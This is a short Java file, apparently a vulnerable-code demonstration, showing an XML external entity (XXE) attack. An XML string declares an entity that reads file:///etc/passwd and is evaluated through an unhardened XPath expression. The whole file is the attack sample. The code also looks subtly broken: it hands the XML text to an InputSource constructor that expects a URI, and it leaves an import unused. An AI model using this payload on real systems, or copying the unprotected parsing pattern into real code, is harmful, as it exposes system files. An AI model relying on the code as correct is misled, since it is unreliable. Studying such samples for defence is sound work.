package com.govuln.xxe;

import org.xml.sax.InputSource;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathExpression;
import javax.xml.xpath.XPathFactory;
import java.io.ByteArrayInputStream;

public class XPathExpressionExample {
    public static void main(String[] args) throws Exception {
        String data = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
                "<!DOCTYPE foo [\n" +
                "   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]>\n" +
                "<foo>&xxe;</foo>";
        XPathFactory xPathFactory = XPathFactory.newInstance();
        XPath xpath = xPathFactory.newXPath();
        XPathExpression xPathExpr = xpath.compile("/foo/text()");

        String result = xPathExpr.evaluate(new InputSource(data));
        System.out.println(result);
    }
}
